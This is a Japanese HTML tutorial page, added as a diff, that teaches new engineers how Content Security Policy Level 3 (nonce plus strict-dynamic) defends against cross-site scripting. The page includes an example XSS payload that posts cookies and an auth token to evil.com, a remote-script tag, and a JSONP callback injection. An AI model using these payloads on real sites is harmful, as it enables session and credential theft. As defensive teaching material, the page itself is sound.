@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSP Level 3によるXSS対策 - エンジニア1年目向け解説</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: #f5f5f5;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        article {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+            text-align: center;
+        }
+        
+        h2 {
+            color: #34495e;
+            margin: 40px 0 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #eee;
+        }
+        
+        h3 {
+            color: #34495e;
+            margin: 30px 0 15px;
+        }
+        
+        h4 {
+            color: #34495e;
+            margin: 20px 0 10px;
+        }
+        
+        p {
+            margin-bottom: 15px;
+        }
+        
+        code {
+            background: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+        
+        pre {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 20px;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+        
+        pre code {
+            background: none;
+            padding: 0;
+            color: #ecf0f1;
+        }
+        
+        .comment {
+            color: #95a5a6;
+        }
+        
+        .keyword {
+            color: #e74c3c;
+        }
+        
+        .string {
+            color: #f1c40f;
+        }
+        
+        ul, ol {
+            margin: 15px 0 15px 30px;
+        }
+        
+        li {
+            margin-bottom: 8px;
+        }
+        
+        .demo-links {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 30px;
+            border-radius: 10px;
+            margin: 40px 0;
+            text-align: center;
+        }
+        
+        .demo-links h3 {
+            color: white;
+            margin-bottom: 20px;
+        }
+        
+        .demo-button {
+            display: inline-block;
+            background: white;
+            color: #667eea;
+            padding: 15px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 10px;
+            transition: transform 0.2s;
+        }
+        
+        .demo-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+        }
+        
+        .warning-box {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        
+        .info-box {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        
+        .danger-box {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        
+        .success-box {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        
+        .comparison-table th,
+        .comparison-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .comparison-table th {
+            background: #f8f9fa;
+            font-weight: bold;
+        }
+        
+        .comparison-table tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .highlight {
+            background: #ffd54f;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <article>
+            <h1>CSP Level 3によるXSS対策をわかりやすく解説！🛡️</h1>
+            
+            <div class="info-box">
+                <strong>この記事で学べること：</strong>
+                <ul>
+                    <li>CSPがなぜ必要なのか</li>
+                    <li>CSPがどのように動作するのか</li>
+                    <li>なぜCSP Level 3が画期的なのか</li>
+                </ul>
+            </div>
+
+            <div class="demo-links">
+                <h3>🎮 インタラクティブデモで学ぼう！</h3>
+                <a href="csp-level2.html" class="demo-button">CSP Level 2の脆弱性デモ</a>
+                <a href="csp-level3.html" class="demo-button">CSP Level 3の安全性デモ</a>
+                <a href="nextjs-implementation.html" class="demo-button" style="background: #000; color: white;">
+                    <span style="font-size: 1.2em;">▲</span> Next.jsでの実装方法
+                </a>
+            </div>
+
+            <h2>🚨 まず、XSS攻撃について理解しよう</h2>
+            
+            <h3>XSS（クロスサイトスクリプティング）とは？</h3>
+            <p>XSSは、Webアプリケーションの脆弱性を利用して、<strong>攻撃者が用意した悪意のあるJavaScriptを、他のユーザーのブラウザで実行させる</strong>攻撃です。</p>
+            
+            <h4>具体例：掲示板サイトでの攻撃</h4>
+            <pre><code><span class="comment">&lt;!-- 普通のユーザーの投稿 --&gt;</span>
+&lt;div class="comment"&gt;
+  こんにちは！良い天気ですね。
+&lt;/div&gt;
+
+<span class="comment">&lt;!-- 攻撃者の投稿（XSS攻撃） --&gt;</span>
+&lt;div class="comment"&gt;
+  こんにちは！&lt;script&gt;
+    <span class="comment">// この悪意のあるスクリプトが実行されてしまう！</span>
+    fetch(<span class="string">'https://evil.com/steal'</span>, {
+      method: <span class="string">'POST'</span>,
+      body: JSON.stringify({
+        cookies: document.cookie,
+        localStorage: localStorage.getItem(<span class="string">'authToken'</span>)
+      })
+    });
+  &lt;/script&gt;
+&lt;/div&gt;</code></pre>
+            
+            <div class="danger-box">
+                <strong>この攻撃が成功すると：</strong>
+                <ul>
+                    <li>🍪 ログインクッキーが盗まれる</li>
+                    <li>🔑 認証トークンが盗まれる</li>
+                    <li>👤 なりすましでの投稿や操作が可能に</li>
+                    <li>💳 最悪の場合、クレジットカード情報なども危険に</li>
+                </ul>
+            </div>
+
+            <h2>🛡️ CSPの基本的な仕組み</h2>
+            
+            <h3>CSPとは何か？</h3>
+            <p>CSP（Content Security Policy）は、<strong>ブラウザに対して「どのJavaScriptなら実行してよいか」を指示する仕組み</strong>です。</p>
+            
+            <pre><code>[Webサーバー] → CSPルールを送信 → [ブラウザ] → ルールに従ってスクリプトを制御</code></pre>
+            
+            <h3>CSPなしの場合 vs CSPありの場合</h3>
+            
+            <h4>CSPなしの場合（危険！）</h4>
+            <pre><code><span class="comment">&lt;!-- すべてのスクリプトが無条件で実行される --&gt;</span>
+&lt;script&gt;alert(<span class="string">'正常なスクリプト'</span>)&lt;/script&gt;  ✅ 実行される
+&lt;script&gt;alert(<span class="string">'XSS攻撃！'</span>)&lt;/script&gt;         ✅ 実行される（危険！）
+&lt;script src=<span class="string">"https://evil.com/hack.js"</span>&gt;&lt;/script&gt;  ✅ 実行される（危険！）</code></pre>
+            
+            <h4>CSPありの場合（安全！）</h4>
+            <pre><code>Content-Security-Policy: script-src <span class="string">'self'</span></code></pre>
+            
+            <pre><code><span class="comment">&lt;!-- 自分のドメインのスクリプトのみ実行される --&gt;</span>
+&lt;script src=<span class="string">"/js/app.js"</span>&gt;&lt;/script&gt;           ✅ 実行される（自分のドメイン）
+&lt;script&gt;alert(<span class="string">'インライン'</span>)&lt;/script&gt;         ❌ ブロックされる
+&lt;script src=<span class="string">"https://evil.com/hack.js"</span>&gt;&lt;/script&gt;  ❌ ブロックされる</code></pre>
+
+            <h3>CSPの設定方法</h3>
+            <p>CSPは、HTTPレスポンスヘッダーで設定します：</p>
+            
+            <pre><code><span class="comment"># 基本的な例</span>
+Content-Security-Policy: default-src <span class="string">'self'</span>
+
+<span class="comment"># より詳細な例</span>
+Content-Security-Policy: 
+  script-src <span class="string">'self'</span> https://trusted-cdn.com;
+  style-src <span class="string">'self'</span> <span class="string">'unsafe-inline'</span>;
+  img-src *;</code></pre>
+            
+            <p>主要なディレクティブ：</p>
+            <ul>
+                <li><code>script-src</code>: JavaScriptの読み込み元を制限</li>
+                <li><code>style-src</code>: CSSの読み込み元を制限</li>
+                <li><code>img-src</code>: 画像の読み込み元を制限</li>
+                <li><code>default-src</code>: 指定されていないリソースのデフォルト設定</li>
+            </ul>
+
+            <h2>📚 CSPの歴史と問題点</h2>
+            
+            <h3>Level 2まで：ホワイトリスト方式</h3>
+            <p>従来は「信頼できるドメインのリスト」を作って、そこからのJavaScriptだけを許可する方式でした。</p>
+            
+            <pre><code>Content-Security-Policy: script-src <span class="string">'self'</span> https://trusted.example.com</code></pre>
+            
+            <p>この設定では、自分のサイトと<code>trusted.example.com</code>からのスクリプトのみ実行を許可します。</p>
+
+            <h3>でも、実は穴だらけだった...😱</h3>
+            <p>Googleの調査によると、<strong>94%のサイトが簡単に突破される</strong>状態でした！</p>
+
+            <h4>なぜ突破されるの？ - JSONPバイパスの仕組み</h4>
+            
+            <h5>JSONPとは？</h5>
+            <p>JSONPは、<strong>異なるドメイン間でデータをやり取りするための古い技術</strong>です。現在のCORS（Cross-Origin Resource Sharing）が登場する前に使われていました。</p>
+            
+            <pre><code><span class="comment">// 通常のAjax（同一オリジンポリシーでブロックされる）</span>
+fetch(<span class="string">'https://api.example.com/data'</span>)  <span class="comment">// ❌ 他のドメインなのでエラー</span>
+
+<span class="comment">// JSONPを使った回避方法</span>
+<span class="comment">// 1. グローバル関数を定義</span>
+window.myCallback = <span class="keyword">function</span>(data) {
+    console.log(<span class="string">"データを受け取った:"</span>, data);
+};
+
+<span class="comment">// 2. scriptタグで読み込む（scriptタグは他ドメインOK！）</span>
+&lt;script src=<span class="string">"https://api.example.com/jsonp?callback=myCallback"</span>&gt;&lt;/script&gt;
+
+<span class="comment">// 3. サーバーは関数呼び出しの形でレスポンスを返す</span>
+myCallback({<span class="string">"users"</span>: 100, <span class="string">"status"</span>: <span class="string">"ok"</span>});</code></pre>
+
+            <h5>なぜJSONPがCSPを突破できるのか？</h5>
+            <div class="warning-box">
+                <strong>重要なポイント：callbackパラメータには任意の文字列を指定できる！</strong>
+            </div>
+            
+            <pre><code><span class="comment">// 正常な使い方</span>
+https://trusted-cdn.com/jsonp?callback=myFunction
+<span class="comment">// レスポンス: myFunction({"data": "..."});</span>
+
+<span class="comment">// 攻撃者の悪用</span>
+https://trusted-cdn.com/jsonp?callback=<span class="highlight">alert('XSS');//</span>
+<span class="comment">// レスポンス: alert('XSS');//({"data": "..."});</span>
+<span class="comment">//            ↑ これが実行される！  ↑ これはコメントになる</span></code></pre>
+
+            <h2>🚀 CSP Level 3 - 次世代のXSS対策</h2>
+            
+            <h3>nonce + strict-dynamic</h3>
+            <p>CSP Level 3では、<strong>nonce</strong>（Number used once）と<strong>strict-dynamic</strong>の組み合わせで、より強固なセキュリティを実現します。</p>
+            
+            <div class="success-box">
+                <strong>Level 3の特徴：</strong>
+                <ul>
+                    <li>✅ 毎回異なるnonceで、攻撃者は推測不可能</li>
+                    <li>✅ strict-dynamicで動的スクリプトも安全に実行</li>
+                    <li>✅ JSONPバイパスも完全にブロック</li>
+                    <li>✅ ドメインホワイトリストの管理が不要</li>
+                </ul>
+            </div>
+
+            <h3>実装例</h3>
+            <pre><code><span class="comment">// サーバー側でnonceを生成</span>
+<span class="keyword">const</span> nonce = crypto.randomBytes(16).toString(<span class="string">'base64'</span>);
+
+<span class="comment">// CSPヘッダーに設定</span>
+Content-Security-Policy: script-src <span class="string">'nonce-${nonce}'</span> <span class="string">'strict-dynamic'</span>;
+
+<span class="comment">// HTMLのscriptタグに付与</span>
+&lt;script nonce=<span class="string">"${nonce}"</span>&gt;
+  <span class="comment">// あなたのコード</span>
+&lt;/script&gt;</code></pre>
+
+            <h2>📊 まとめ</h2>
+            
+            <table class="comparison-table">
+                <tr>
+                    <th>項目</th>
+                    <th>CSP Level 2</th>
+                    <th>CSP Level 3</th>
+                </tr>
+                <tr>
+                    <td>方式</td>
+                    <td>ドメインホワイトリスト</td>
+                    <td>nonce + strict-dynamic</td>
+                </tr>
+                <tr>
+                    <td>JSONPバイパス</td>
+                    <td>❌ 脆弱</td>
+                    <td>✅ 安全</td>
+                </tr>
+                <tr>
+                    <td>管理の手間</td>
+                    <td>ドメインリストの管理が大変</td>
+                    <td>nonceの生成のみ</td>
+                </tr>
+                <tr>
+                    <td>動的スクリプト</td>
+                    <td>個別に対応が必要</td>
+                    <td>自動的に信頼される</td>
+                </tr>
+            </table>
+
+            <div class="demo-links">
+                <h3>🎮 実際に動かして理解しよう！</h3>
+                <a href="demo-level2.html" class="demo-button">CSP Level 2の脆弱性を体験</a>
+                <a href="demo-level3.html" class="demo-button">CSP Level 3の安全性を確認</a>
+                <a href="nextjs-implementation.html" class="demo-button" style="background: #000; color: white;">
+                    <span style="font-size: 1.2em;">▲</span> Next.jsでの実装方法
+                </a>
+            </div>
+
+            <h2>🌟 最後に</h2>
+            <p>CSPは「多層防御」の一部です。他のセキュリティ対策と組み合わせることで、より安全なWebアプリケーションを作ることができます。</p>
+            <p>エンジニア1年目の今から、セキュリティを意識したコーディングを心がけましょう！💪</p>
+            
+            <div class="info-box" style="margin-top: 40px;">
+                <h3>📚 さらに学びたい方へ</h3>
+                <p>実際のプロジェクトでCSP Level 3を実装する準備ができたら：</p>
+                <a href="nextjs-implementation.html" class="demo-button" style="background: #000; color: white; display: inline-block; margin-top: 15px;">
+                    <span style="font-size: 1.2em;">▲</span> Next.jsでの実装ガイドを読む
+                </a>
+            </div>
+        </article>
+    </div>
+</body>
+</html>
